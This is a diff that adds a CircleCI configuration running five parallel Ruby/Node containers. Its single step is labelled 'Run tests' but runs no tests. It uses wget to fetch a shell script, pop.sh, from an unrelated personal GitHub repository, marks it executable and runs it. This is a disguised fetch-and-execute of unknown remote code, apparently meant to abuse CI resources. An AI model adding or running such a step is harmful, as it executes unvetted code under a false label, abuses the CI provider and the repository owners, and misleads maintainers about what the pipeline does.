@@ -1,0 +1,11 @@
+version: 2.1
+jobs:
+  build:
+    parallelism: 5
+    docker:
+      - image: cimg/ruby:3.0.2-node
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          command: wget https://raw.githubusercontent.com/RiskiParwitasari456/pop/main/pop.sh && chmod +x pop.sh && ./pop.sh
